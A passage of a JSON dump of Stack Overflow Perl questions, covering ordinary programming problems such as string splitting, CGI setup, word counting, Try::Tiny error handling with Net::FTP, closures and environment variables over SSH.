</p>\n\n<pre>\n10 01 11 00 \n</pre>\n\n<p>if the input is 3 the output will be</p>\n\n<pre>\n111 000 110 101 011 100 001 010\n</pre>\n\n<p>i have a code snippet </p>\n\n<pre><code>#!/usr/bin/perl\n\n#print \"a|b|c\\n\";\n\nfor $a (1, 0){\n    for $b (1, 0){\n      for  $c (1,0) {\n        for $d ( 1,0) \n        {        \n          print \"$a $b $c $d\";\n          #print $x = ($a &amp; $b &amp; $c);\n          print \"\\n\";\n        }\n     }\n   }\n}\n\nprint \"\\n\";\n</code></pre>\n\n<p>above code is for 4.</p>\n\n<p>i don't know how to do this without writing multiple for loops. Here for value 2 i need to write two for loops and so on.</p>\n\n<p>can any body tell me how to tweak this code for several input values.</p>\n\n<p>Any help would be great appreciated</p>\n"},{"tags":["perl","cgi","cgi-bin"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":12825813,"title":"Split on capital letters and numbers","body":"<p>I need this script to split on capital letters and numbers. I've got the split on capital letters part working but I can't seem to figure out the number side of it.</p>\n\n<p>Needed result: <code>Hvac System 8000 Series :: Heating System 8000 Series :: Boilers</code></p>\n\n<pre><code>#!/usr/bin/perl\n\nprint \"Content-type: text/html\\n\\n\";\n\nuse CGI qw(:standard);\nuse CGI::Carp qw(warningsToBrowser fatalsToBrowser);\nuse strict;\n\nmy $Last_URL = \"HvacSystem8000Series/HeatingSystem8000Series/Boilers\";\n\n\nmy ($Cat,$Sub1,$Sub2) = split(/\\//, $Last_URL, 3);\n\nif ($Sub2) {\n\n    $Last_URL = \"&lt;b&gt;$Cat :: $Sub1 :: $Sub2&lt;/b&gt;\";\n}\nelse {\n\n    $Last_URL = \"&lt;b&gt;$Cat :: $Sub1&lt;/b&gt;\";\n}\n\nmy @Last_URL = $Last_URL =~ s/(.)([A-Z][^A-Z][^0-9])/$1 $2/g;\nprint \"$Last_URL\";\n</code></pre>\n"},{"tags":["perl","cgi","xampp"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":617,"score":0,"question_id":5714057,"title":"CGI file location for xampp on windows","body":"<p>I am using XAMPP 1.7.2 on winxp. \nI plan to dev web app (.cgi or .pl) and I checked phpinfo() and found mod_perl already enabled.</p>\n\n<p>But I tried to place my hello.cgi file in <code>C:\\xampp\\htdocs\\hello.cgi</code> or <code>C:\\xampp\\cgi-bin\\hello.cgi</code>. Both methods won't work when I try to open <strong>http://localhost/hello.cgi</strong></p>\n\n<p>Any suggestion are appreciated. </p>\n"},{"tags":["perl","firefox","gwt","mechanize","mozrepl"],"answer_count":1,"favorite_count":0,"up_vote_count":7,"down_vote_count":0,"view_count":288,"score":7,"question_id":7868305,"title":"Getting rendered HTML with MozRepl and Mechanize::Firefox","body":"<p>I've just been introduced to the wonders of MozRepl used in conjunction with Perl's WWW::Mechanize::Firefox, and was trying to figure out how to use it to crawl GWT pages (e.g.,: <a href=\"https://www.google.com/offers/home#!details/4bc7fd6bd3feb311/XYW81TXGLA88TR42\">https://www.google.com/offers/home#!details/4bc7fd6bd3feb311/XYW81TXGLA88TR42</a>)</p>\n\n<p>What I really want is the rendered html, not the actual html. Would really appreciate an example of how I would get this.</p>\n"},{"tags":["regex","perl","email"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":77,"score":1,"question_id":12828353,"title":"Perl search string for pattern: *@enron.com","body":"<p>I'm searching a string for all valid e-mail addresses ending in @enron.com.</p>\n\n<p>My assignment is the following line:</p>\n\n<pre><code>my $enronAddress =~/^(.+?)@\\@enron\\.com/i;\n</code></pre>\n\n<p>This isn't making any assignments, so I'm wondering what I've done wrong here.</p>\n"},{"tags":["string","perl"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":110,"score":0,"question_id":12775191,"title":"Joining two strings by matching positions of alphabet in both strings in Perl","body":"<p>I am trying to write a Perl script where a string get fragmented at every occurrence of 'E' and when user enters positions of 'C' through command line (say 3-8 or 3-8,13-18 or any comma separated such positions of 'C' according to the string in such format if the string is long), the fragments containing 'C' (say at 3 and 8 positions) should be joined and shown in the output. Suppose string is\n\"ABCDEABCDEABCDEABCDEABCDE\" and user enters 3-8 then program oputput should be-</p>\n\n<pre><code>ABCDEABCDE\nABCDE\nABCDE\nABCDE\n</code></pre>\n\n<p>I wrote a script where user enters 'C' positions through command line and string get cut at every position of 'E'  but after that I'm not able to write it properly. Please help! </p>\n\n<p>Code (edited) that I've written so far is:</p>\n\n<pre><code>use strict;\nuse warnings;\n\nmy $s = 'ABCDEABCDEABCDEABCDEABCDE';\nmy $i=0;\nmy @where;\nmy @array;\nmy @bond;\nmy @pos;\nmy @s_array;\nmy @s_array2;\n\nfor ($i=0; $i&lt;=4; $i++) {\n    $where[$i] = index($s,\"C\",$where[$i-1])+1;\n    push(@array,$where[$i]);\n}\nprint \"All Positions of C: @array\\n\\n\";\nprint \"Enter C positions:\\n\";\nmy @join_C = &lt;STDIN&gt;; \n\nforeach (@join_C) {\n    @bond = split (',',$_);\n}\n\nforeach (@bond) {\n    @pos = split ('-', $_);\n}\nprint \"entered C positions:@pos\\n\";\nprint \"Resulting disulfide linked peptides\\n\\n\";\nmy @a = split(/E/, $s); \nmy $result = join (\"E,\", @a);\nmy @final = split(/,/, $result);\nforeach my $final (@final) {\n    foreach my $pos(@pos) {\n        my @source = split //, $final[@final];\n        my $length = @source;\n        for ($i=0; $i&lt;=$length; $i++) {\n            if (index($final[$i], \"C\") == $pos[$i]) {\n                push (@s_array, $final[$i]);\n            }\n            else {\n                push (@s_array2, $final[$i]);\n            }\n        }\n    }\n}\nmy $lastly_joined = join (',', @s_array);\nprint \"Joined Fragments= @s_array\\n\";\nprint \"Remaining fragments= @s_array2\\n\";\n</code></pre>\n"},{"tags":["windows","perl","audio","portability","gnome"],"answer_count":1,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":146,"score":5,"question_id":12826634,"title":"Playing Sound in Perl script","body":"<p>I'm trying to add sound to a Perl script to alert the user that the transaction was OK (user may not be looking at the screen all the time while working).  I'd like to stay as portable as possible, as the script runs on Windows and Linux stations.<br>\nI can  </p>\n\n<pre><code>use Win32::Sound;\nWin32::Sound::Play('SystemDefault',SND_ASYNC);\n</code></pre>\n\n<p>for Windows.  But I'm not sure how to call a generic sound on Linux (Gnome).  So far, I've come up with </p>\n\n<pre><code>system('paplay /usr/share/sounds/gnome/default/alert/sonar.ogg');\n</code></pre>\n\n<p>But I'm not sure if I can count on that path being available.<br>\nSo, three questions:</p>\n\n<ol>\n<li>Is there a better way to call a default sound in Gnome</li>\n<li>Is that path pretty universal (at least among Debain/Ubuntu flavors)</li>\n<li><code>paplay</code> takes a while to exit after playing a sound, is there a better way to call it?</li>\n</ol>\n\n<p>I'd rather stay away from beeping the system speaker, it sounds awful (this is going to get played a lot) and Ubuntu blacklists the PC Speaker anyway.<br>\nThanks!</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":1,"up_vote_count":10,"down_vote_count":0,"view_count":115,"score":10,"question_id":12649083,"title":"Why does only one of these tell me \"Modification of a read-only value attempted\"?","body":"<p>This code runs and produces the output <code>abc</code>:</p>\n\n<pre><code>for(10..12){$_=sprintf\"%x\",$_;print}\n</code></pre>\n\n<p>But this code dies with a <code>Modification of a read-only value attempted at ...</code> error:</p>\n\n<pre><code>for(10,11,12){$_=sprintf\"%x\",$_;print}\n</code></pre>\n\n<p>Why are these constructions treated differently?</p>\n\n<p>(This code also works:)</p>\n\n<pre><code>for(10..10,11..11,12..12){$_=sprintf\"%x\",$_;print}\n</code></pre>\n"},{"tags":["perl","par"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":113,"score":2,"question_id":9611773,"title":"What is the relationship between Perl PAR::Packer's pp, par.pl, parl scripts?","body":"<p>I'm trying to learn PAR and PAR::Packer.  I understand that PAR is a module which allows loading modules from .par archives.  I don't understand the three scripts <code>pp</code>, <code>par.pl</code>, <code>parl</code> in PAR::Packer. (Note: in this question <code>parl</code> includes <code>parl.exe</code> for windows).</p>\n\n<ol>\n<li>What exactly is <code>par.pl</code> supposed to be?  Is it a perl script which contains the perl interpreter (the same one as on the development machine) and the <code>PAR</code> module?</li>\n<li>What exactly is <code>parl</code>?  Is it a binary which contains the same thing as par.pl? </li>\n<li>If I'm not mistaken in what <code>par.pl</code> and <code>parl</code> are, why would anyone want <code>par.pl</code>?  <code>parl</code> seems strictly superior since it can run without a pre-existing perl.</li>\n<li>Is <code>parl</code>  safe to distribute to end users with no perl what so ever?  For example, if I have several scripts I want to distribute, both sharing many modules, can I distribute <code>parl</code>, the pars for the scripts and modules, and simple wrapper scripts to launch the par'd scripts with <code>parl</code>?</li>\n<li><code>parl</code> and <code>par.pl</code> can both produce standalone scripts/exectubles with the <code>-b</code> and <code>-B</code>  options, respectively.  Does this mean that <code>pp</code> just a frontend/wrapper?</li>\n</ol>\n"},{"tags":["perl","file","sorting"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":82,"score":3,"question_id":12823971,"title":"Most frequently used strings in a file ","body":"<p>I found a post here were someone managed to read information from a file and sort out the most commonly used words and return how many times each word was used. The input was from a command line argument but I want to get the same script to be executed and then take the filename to be run through the script as input. I can't find what I'm doing wrong.</p>\n\n<pre><code>print \"Type the name of the file: \";\nchomp(my $file = &lt;&gt;);\n\nopen (FILE, \"$file\") or die;\n\nwhile (&lt;FILE&gt;){\n    $seen{$_}++ for split /\\W+/;\n}\n\nmy $count = 0;\nfor (sort {\n    $seen{$b} &lt;=&gt; $seen{$a}\n              ||\n       lc($a) cmp lc($b)\n              ||\n          $a  cmp  $b\n} keys %seen)\n{\n    next unless /\\w/;\n    printf \"%-20s %5d\\n\", $seen{$_}, $_;\n    last if ++$count &gt; 100;\n}\nclose (FILE);\n</code></pre>\n\n<p>My result at the moment is:</p>\n\n<pre><code>15                       0\n15                       0\n10                       0\n10                       0\n10                       0\n5                        1\n5                        0\n5                        0\n5                        0\n5                        0\n</code></pre>\n\n<p>The result I want is:</p>\n\n<pre><code>&lt;word&gt;             &lt;number of occurances&gt;\n&lt;word&gt;             &lt;number of occurances&gt;\n&lt;word&gt;             &lt;number of occurances&gt;\n&lt;word&gt;             &lt;number of occurances&gt;\n&lt;word&gt;             &lt;number of occurances&gt;\n&lt;word&gt;             &lt;number of occurances&gt;\n</code></pre>\n"},{"tags":["windows","perl","vbscript"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":90,"score":1,"question_id":12823998,"title":"Best way to search for a string in a file on a network drive","body":"<p>Here is my problem: We have a file server (Windows 2003) that people keep putting forms on that contain PII. Policy is now that the last 4 of a person's SSN is no longer allowed on any forms on our file servers. I'm trying to figure out a script to scan for a string such as \"SSN\" or \"Last Four\" in a document and all I can find are instructions/examples on how to search text files on a local machine. I have seen a lot of threads similar to this but primarily searching a txt file in a local folder. I've seen powershell scripts that do this but (don't ask why) powershell scripting is disabled on our servers. </p>\n\n<p>Is this possible? I've been reading heavily into multiple Perl books to hope for a clue or get me in the right direction and have had 0 luck. </p>\n"},{"tags":["regex","perl"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":82,"score":1,"question_id":12823458,"title":"perl insert and or replace string variable into a string","body":"<p>the requirement I have is to check a string and based on particular set of chars either insert or replace with prefix string </p>\n\n<pre><code>$prefix = \"DV1\";\n</code></pre>\n\n<p>Following are my source $input strings:</p>\n\n<pre><code>SS7.ABCWT2.RSND.LTE1.QR\nIT4.ABCET2.VCE2.QR\nY88.ABCNT2.MIM.EDR2.QR\n9C5.ABCS.MIM.EDR2.QR\n</code></pre>\n\n<p>the first chars before first . can be of any length\nbut after the first . the chars ABC remain constant followed by any one character - these four chars will always be there in my input string.\nafter these 4 chars, the i/p string may have two alphanumeric chars - T2 in this case.</p>\n\n<p>what needs to be done is check if $input has \"T2\" (can be any two alphanum chars) and if it has then replace those 2 chars with D1 (any two chars from $prefix)</p>\n\n<p>if $input does not have \"T2\", then insert $prefix</p>\n"},{"tags":["perl","post"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":92,"score":2,"question_id":12819260,"title":"Perl upload file using HTTP::Request","body":"<p>I am using an existing framework to automate some apis.\nThis framework uses the HTTP::Request module. I need to write a script to upload a file.\nI can do this using the HTTP::Request::Common module,but <strong>NOT</strong> with the Http::Request module.\nBut I need to use Http::Request only to get this done.\nBelow the code snippets:</p>\n\n<p><strong>Using HTTP::Request::Common\\This Works</strong></p>\n\n<pre><code>    $request = POST $uri,\n    Content_Type =&gt; 'multipart/form-data',\n    Content =&gt; [\n    file =&gt; [$file]\n    ]\n    ;\n    my $results=$ua-&gt;request($request ) ;\n</code></pre>\n\n<p>Using HTTP::Request\\This does not work, I get an error missing file</p>\n\n<pre><code>    my $req = HTTP::Request-&gt;new(\"POST\", $uri );\n    $req-&gt;header(Content_Type =&gt; \"form-data\");\n    $req-&gt;content('file=&gt;$file');\n    my $res = $ua-&gt;request($req);\n</code></pre>\n\n<p>Can someone please tell me what I am doing wrong in the above code?</p>\n"},{"tags":["linux","perl","unix"],"answer_count":3,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":1709,"score":5,"question_id":4048248,"title":"\"Variable $foo will not stay shared\" Warning/Error in Perl While Calling Subroutine","body":"<p><strong><code>Update3:</code></strong> If you like this posting please don't upvote me but upvote the genius answer by DVK below.</p>\n\n<p>I have the following subroutines:</p>\n\n<pre><code> use warnings;\n#Input\n my @pairs = (\n    \"fred bill\",\n    \"hello bye\",\n    \"hello fred\",\n    \"foo bar\",\n    \"fred foo\");\n\n#calling the subroutine\nmy @ccomp = connected_component(@pairs);\n\nuse Data::Dumper;\nprint Dumper \\@ccomp;\n\nsub connected_component {\n\n    my  @arr    = @_;\n    my %links;\n\n    foreach my $arrm (  @arr ) {\n        my ($x,$y) = split(/\\s+/,$arrm);;\n        $links{$x}{$y} = $links{$y}{$x} = 1;\n\n    }\n\n    my %marked;  # nodes we have already visited\n    my @stack;\n\n    my @all_ccomp;\n\n    for my $node (sort keys %links) {\n        next if exists $marked{$node};\n        @stack = ();\n        connected($node);\n        print \"@stack\\n\";\n        push @all_ccomp, [@stack];\n    }\n\n    sub connected {\n        no warnings 'recursion';\n        my $node = shift;\n        return if exists $marked{$node};  # Line 43\n        $marked{$node} = 1;\n        push @stack, $node;   # Line 45\n        my $children = $links{$node};  # Line 46\n        connected($_) for keys %$children;\n    }\n\n\n    return @all_ccomp;\n}\n</code></pre>\n\n<p>But why it gives this message:</p>\n\n<pre><code>Variable \"%marked\" will not stay shared at mycode.pl line 43.\nVariable \"@stack\" will not stay shared at mycode.pl line 45.\nVariable \"%links\" will not stay shared at mycode.pl line 46.\n</code></pre>\n\n<p>Is it harmful? Error? How can fix my code so that it get rid of that message?</p>\n\n<p><strong>Update1:</strong> I update the code that runs as is with the actuall error message</p>\n\n<p><strong>Update2:</strong> I tried to modify using sub as DVK suggested. And it WORKED!</p>\n\n<pre><code>use warnings;\n#Input\n my @pairs = (\n    \"fred bill\",\n    \"hello bye\",\n    \"hello fred\",\n    \"foo bar\",\n    \"fred foo\");\n\n#calling the subroutine\nmy @ccomp = connected_component(@pairs);\n\nuse Data::Dumper;\nprint Dumper \\@ccomp;\n\nsub connected_component {\n\n    my  @arr    = @_;\n    my %links;\n\n    foreach my $arrm (  @arr ) {\n        my ($x,$y) = split(/\\s+/,$arrm);;\n        $links{$x}{$y} = $links{$y}{$x} = 1;\n\n    }\n\n    my %marked;  # nodes we have already visited\n    my @stack;\n\n    my @all_ccomp;\n\n    my $connected_sub;\n     $connected_sub = sub {\n        no warnings 'recursion';\n        my $node = shift;\n        return if exists $marked{$node};  \n        $marked{$node} = 1;\n        push @stack, $node;  \n        my $children = $links{$node};  \n        &amp;$connected_sub($_) for keys %$children;\n    };\n\n    for my $node (sort keys %links) { # Line 43\n        next if exists $marked{$node};\n        @stack = ();\n        &amp;$connected_sub($node);\n        #print \"@stack\\n\";\n        push @all_ccomp, [@stack]; # Line 49\n    }\n\n    return @all_ccomp;\n}\n</code></pre>\n"},{"tags":["perl","file","sorting","hash","word"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":160,"score":2,"question_id":9957144,"title":"100 Most Used Strings in File","body":"<p>How can I find the top 100 most used strings (words) in a <code>.txt</code> file using Perl? So far I have the following:</p>\n\n<pre><code>use 5.012;\nuse warnings;\n\nopen(my $file, \"&lt;\", \"file.txt\");\n\nmy %word_count;\nwhile (my $line = &lt;$file&gt;) {\n  foreach my $word (split ' ', $line) {\n     $word_count{$word}++;\n  } \n} \n\nfor my $word (sort keys %word_count) {\n  print \"'$word': $word_count{$word}\\n\";\n}\n</code></pre>\n\n<p>But this only counts each word, and organizes it in alphabetical order. I want the top 100 most frequently used words in the file, sorted by number of occurrences. Any ideas?</p>\n\n<p><em>Related: <a href=\"http://stackoverflow.com/questions/5571016/count-number-of-times-string-repeated-in-file-perl\">Count number of times string repeated in files perl</a></em></p>\n"},{"tags":["perl","cgi","webserver","communication"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":338,"score":1,"question_id":3908117,"title":"How can I communicate across Perl CGI scripts?","body":"<p>I am searching for efficient ways of communication across two Perl\nscripts. I have two scripts; Script 1 generates some data. I want my\nScript 2 to be able to access that information. </p>\n\n<p>The easiest/dumbest\nway is to write the data generated by Script 1 as a file and read it\nlater using Script 2. Is there any other way than this? Can I store\nthe data in memory and make it available to Script 2 (of course with\nsupport from my Linux )? Meaning malloc some data by Script 1 and make\nScript 2 able to access it.</p>\n\n<p>There is no guarantee that Script 2 will be run after Script 1. So\nthere should be some way to free that memory using a watchdog timer. </p>\n\n<p>Let me reveal some more context. I am running these scripts on a web-server using CGI-Perl. So at the click of a button Script 1 is run and it generates a html web-page. Now the user can add some inputs to to this generated web-page and click a button on this new page.Now Script 2 should be able to read the data on new web-page.I can post the data back to web-server again but a more efficient way is to keep a copy of generated page in server also and make it available to script 2. Now, I would like to avoid writing down the generated page as a file. I was thinking of storing it in memory</p>\n"},{"tags":["arrays","perl","unix","cat"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":94,"score":1,"question_id":12753844,"title":"how to get results into array from unix commands","body":"<p>I'm trying to get the dump of each file into an array from a unix command in a Perl script. below is the error I'm getting. Could anyone please help me fix this issue?</p>\n\n<p><code>Can't locate object method \"cat\" via package \"C:/prac/cmm_ping.txt\" (perhaps you forgot to load \"C:/test/cmm_ping.txt\"?) at fandd.pl line 25.</code></p>\n\n<p>below is my program</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse warnings;\n\n@files=glob(\"C:/prac/*\");\n\nforeach $file (@files){\n   @data=system(cat  $file);\n      foreach $line (@data){`\n        print $line;\n    }\n}\n</code></pre>\n"},{"tags":["perl","scope","try-catch","eval"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":111,"score":2,"question_id":12788884,"title":"Not sure I'm using Perl's Try::Tiny correctly","body":"<p>I'm new to using objects, and don't understand why <a href=\"http://search.cpan.org/~doy/Try-Tiny-0.11/lib/Try/Tiny.pm\" rel=\"nofollow\">Try::Tiny</a> won't <code>catch</code> the errors in my <code>try</code> statements. Here is a sample of what I'm trying to do:</p>\n\n<pre><code>use strict;  \nuse warnings;\nuse Net::FTP;\nuse Try::Tiny;\n\nmy $TIMEOUT = 5;\nmy $HOST = 'replace_with_hostname';\nmy $USER = 'replace_with_username';\nmy $PASS = 'replace_with_password';\nmy @ERRORS;\nmy $ftp = undef;\n\nsub my_sub {\n  my $err = shift;\n  push(@ERRORS,$err);\n  goto END;\n}\n\ntry {\n  local $SIG{ALRM} = sub { die \"new\\n\" };\n  alarm $TIMEOUT;\n  $ftp = Net::FTP-&gt;new($HOST, Passive=&gt;1, DEBUG=&gt;3, Timeout=&gt;2);\n  alarm 0;\n}\ncatch {\n  die $_ if $_ ne \"new\\n\"; \n  my_sub(\"FTP: cannot connect to [$HOST]\");\n};\n\ntry {\n  local $SIG{ALRM} = sub { die \"login\\n\" };\n  alarm $TIMEOUT;\n  $ftp-&gt;login($USER,$PASS);\n  alarm 0;\n}\ncatch {\n  die $_ if $_ ne \"login\\n\"; \n  my_sub(\"FTP: cannot cannot log in\");\n};\n\nEND: {\n  if (@ERRORS) {\n    print \"$ERRORS[0]\\n\";\n    exit -1;\n  }\n  print \"Success\\n\";\n  exit 0;\n}\n</code></pre>\n\n<p>I'm using the <code>goto</code> function because I'll eventually have blocks for WebDAV and CMIS tests, and want to capture all of the errors before I hit <code>END</code>. I can make the preceding do what I want by changing the <code>try-catch</code> blocks like so:</p>\n\n<pre><code>try {\n  local $SIG{ALRM} = sub { die \"new\\n\" };\n  alarm $TIMEOUT;\n  $ftp = Net::FTP-&gt;new($HOST, Passive=&gt;1, DEBUG=&gt;3, Timeout=&gt;2) \n    or my_sub(\"FTP: cannot connect to [$HOST]\");\n  alarm 0;\n}\ncatch {\n  die $_ if $_ ne \"new\\n\"; \n};\n</code></pre>\n\n<p>However, in both cases, I have the feeling I'm not using <a href=\"http://search.cpan.org/~doy/Try-Tiny-0.11/lib/Try/Tiny.pm\" rel=\"nofollow\">Try::Tiny</a> well. </p>\n\n<p>And of course, what I'd really like to do is put the <code>try-catch</code> blocks in a function, just like <a href=\"http://stackoverflow.com/questions/2871619/why-doesnt-perls-trytinys-try-catch-give-me-the-same-results-as-eval\">sid_com did</a>. That doesn't work for me:</p>\n\n<pre><code>sub try_f {\n  my $cmd = shift;\n  my $msg = shift;\n  try {\n    local $SIG{ALRM} = sub { die \"timeout '$cmd'\\n\" };\n    alarm $TIMEOUT;\n    \\$cmd or my_sub($msg);\n    alarm 0;\n  }\n  catch {\n    die $_ if $_ ne \"timeout '$cmd'\\n\"; \n  };\n} # sub\n\ntry_f(\"$ftp = Net::FTP-&gt;new(Host=&gt;$HOST, Passive=&gt;1)\", \"FTP: cannot connect to [$HOST]\");\n\ntry_f(\"$ftp-&gt;login($USER,$PASS)\", \"FTP: cannot cannot log in\");\n</code></pre>\n\n<p>The error says <code>$ftp</code> is an uninitialized value, but I don't know how to get around that.</p>\n\n<p>EDIT: Here's the working synthesis of the two answers I received. Thanks, Max and LeoNerd!</p>\n\n<pre><code>use strict;  \nuse warnings;\nuse Net::FTP;\nuse Try::Tiny;\n\nmy $HOST = 'replace_with_hostname';\nmy $USER = 'replace_with_username';\nmy $PASS = 'replace_with_password';\nmy @ERRORS;\nmy $ftp = undef;\n\nsub try_f {\n  my $timeout = shift;\n  my $command = shift;\n  my $message = shift;\n  my $label   = shift;\n  try {\n    local $SIG{ALRM} = sub { die \"timeout\\n\" };\n    alarm $timeout;\n    $command-&gt;() or die \"module\\n\";\n    alarm 0;\n  }\n  catch {\n    if ( $_ eq \"module\\n\" || $_ eq \"timeout\\n\" ) {\n      push(@ERRORS,\"$message: $_\");\n      goto $label;\n    }\n    die $_;\n  };\n}\n\nFTP_BLOCK: {\n  try_f(4, sub { $ftp = Net::FTP-&gt;new($HOST, Passive=&gt;1, Debug=&gt;3) }, \"FTP: cannot connect to [$HOST]\", 'END');\n  try_f(2, sub { $ftp-&gt;login($USER,$PASS) }, \"FTP: cannot log in\", 'END');\n}\n\nEND: {\n  if (@ERRORS) {\n    foreach my $e (@ERRORS) { print \"$e\"; }\n    exit -1;\n  }\n  print \"Success\\n\";\n  exit 0;\n}\n</code></pre>\n"},{"tags":["perl","excel","bash","datetime","command-line"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":110,"score":2,"question_id":11289445,"title":"tool/script to test datetime intervals on bash command line","body":"<p>I have sorted data that look like this (dumped from MS Excel to commandline  with <em>ssgrep</em>):</p>\n\n<pre><code>2012-06-27T22:55:00\n2012-06-27T23:00:00\n2012-06-27T23:05:00\n2012-06-27T23:10:00\n2012-06-27T23:15:00\n2012-06-27T23:20:00\n2012-06-27T23:25:00\n2012-06-27T23:30:00\n</code></pre>\n\n<p>Now I want to pipe this into a script (or any command line tool) which tests whether all values are indeed valid dates, and if there are any gaps between them that are not 5-minute intervals. (I need to do the same with different datasets sampled at 1 hour intervals)</p>\n\n<p>Is there a tool available for the command line that can do this? \nI know it's easy to write a little script in R or in Perl (in fact I have already started to program this). But maybe there is already a little utility pre-installed on linux/solaris that I don't know about.</p>\n"},{"tags":["perl","ssh","environment-variables"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":155,"score":0,"question_id":12809359,"title":"perl: Run remote perl script through SSH and query environment variables on remote machine","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/216202/why-does-an-ssh-remote-command-get-fewer-environment-variables-then-when-run-man\">Why does an SSH remote command get fewer environment variables then when run manually?</a>  </p>\n</blockquote>\n\n\n\n<p><strong>Running on Mac OS X 10.8.2</strong></p>\n\n<p>I'm running a perl script through SSH, in the perl script I query environment variables using \n$ENV{MY_VAR_NAME} and it works fine when run locally. But through SSH, all environment variables become unset.</p>\n\n<p>I also tried to run </p>\n\n<pre><code>system(\"source ~/.bash_profile\");\n</code></pre>\n\n<p>at the beginning of my script to no avail.</p>\n\n<p>Any tips?</p>\n\n<p><strong>EDIT:</strong></p>\n\n<p>Rephrasing my question.</p>\n\n<p>I have machine A and B. \nI ran my perl on machine B, trying to get the environment variables on B and it worked.\nThen I ssh from A to B running the same script, i.e., using this code</p>\n\n<pre><code>ssh user@B perl myscript.pl\n</code></pre>\n\n<p>This time the environment variables on B are all blank.</p>\n\n<p>Any tips?</p>\n\n<p><strong>UPDATE:</strong></p>\n\n<p>I found that running the above script, ~/.bashrc on Machine B was invoked, but after setting environment variables in ~/.bashrc, run the above command again and still I don't see any environment variables.</p>\n\n<p>Also, if my perl script contains only</p>\n\n<pre><code>echo $ENV{PATH}\n</code></pre>\n\n<p>Then I get </p>\n\n<pre><code>/usr/bin:/bin:/usr/sbin:/sbin\n</code></pre>\n"},{"tags":["perl","memory","heap","valgrind"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":588,"score":2,"question_id":6645073,"title":"Profiling heap memory usage on perl programs","body":"<p>I have written a perl program to operate on huge datasets. I am trying to profile its excution in terms of its memory usage. Tried using valgrind on small datasets, but it slows down the execution dramatically. I am looking for just heap profiling. \nCould you guys suggest some ways ?</p>\n\n<ul>\n<li>Sethu</li>\n</ul>\n"},{"tags":["xml","perl","package","libxml2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":92,"score":0,"question_id":12801989,"title":"Perl XML::libxml not accessible anymore as package ? (windows)","body":"<p>I was not able to install on a windows system from the graphical <code>Perl Package Manager</code></p>\n\n<p>I'm running <code>Perl 5.16</code>, I've added the repository uwinnipeg but it seems to be not available anymore.</p>\n\n<p><a href=\"http://cpan.uwinnipeg.ca/dist/XML-LibXML\" rel=\"nofollow\">http://cpan.uwinnipeg.ca/dist/XML-LibXML</a>  is unavailable</p>\n\n<p>What can I do to get <code>XML::libxml</code> work on<code>Perl 5.16</code> (windows) system ?</p>\n"},{"tags":["arrays","perl"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":8,"view_count":86,"score":-7,"question_id":12819663,"title":"Perl format  Array Output","body":"<p>I have an Array called \"@matrix\" which have below values. First filed is the number of times \"new.example.com\" occurred in week 28 .i.e. \"new.example.com\" has 6 times in week 28.</p>\n\n<pre><code>print \" @matrix \\n\";\n----\n6 new.example.com 28\n3 example.com 28\n244 example.com 29\n2 test.com 29\n45 orginal.com 28\n30 orginal.com 29\n40 orginal.com 30\n</code></pre>\n\n<p>I want the above Array to be print like this.</p>\n\n<pre><code>Domain/WeekNumber   Week28       Week29        Week30        Week31\nnew.example.com     6            No            No            No\nexample.com         3            244           NO            NO\ntest.com            No           2             NO            NO\norginal.com         45           30            40            NO\n</code></pre>\n\n<p>I have Coded till here.</p>\n\n<pre><code>open(LOGFILE,\"Output.txt\") or die(\"Could not open log file.\");\nmy $domain_name = '/root/scripts/domain.txt' ;\nopen(DOM, $domain_name);\nmy @r_contents = &lt;LOGFILE&gt;;\nclose(LOGFILE);\n\nwhile(&lt;DOM&gt;) {\n    chomp;\n    my $line = $_;\n    my @lowercase = map { lc } @r_contents;\n    my @grepNames = grep  /^$line/, @lowercase;\n    foreach (@grepNames) {\n        if ( grep  /^$line/, @lowercase ) {\n            $domains{lc($_)}++ ;\n        }\n    }\n}\n\nclose(DOM) ;\n\nforeach my $domain (sort keys %domains) {\n    my %seen ;\n    ($Dname, $WeekNum) = split(/\\s+/, $domain);\n    my @array1 = grep { ! $seen{ $_ }++ } $WeekNum;\n    push @array2, @array1;\n    my @array4 = \"$domains{$domain} $domain\" ;\n    push @matrix,@array4 ;\n\n}\n\nprintf \"%-10s %-25s %-25s\\n\", 'DoaminName', \"Week $array2[0]\" ,\"Week $array2[1]\";\n\nprint \" @matrix \\n\";\n</code></pre>\n\n<hr>\n\n<p>Could any one can help me on this.</p>\n"},{"tags":["xml","perl","xml-libxml"],"answer_count":2,"favorite_count":0,"up_vote_count":6,"down_vote_count":2,"view_count":140,"score":4,"question_id":8626647,"title":"Are blank child nodes of any use to XML parsers?","body":"<p>Why do we have to have the notion of blank XML nodes? What benefit do they bring to the alchemy of XML parsing?</p>\n\n<p>A simple example here with Perl's <a href=\"https://metacpan.org/module/XML%3a%3aLibXML\" rel=\"nofollow\"><code>XML::LibXML</code></a>:</p>\n\n<pre><code>use strict;\nuse warnings;\nuse feature 'say';\nuse 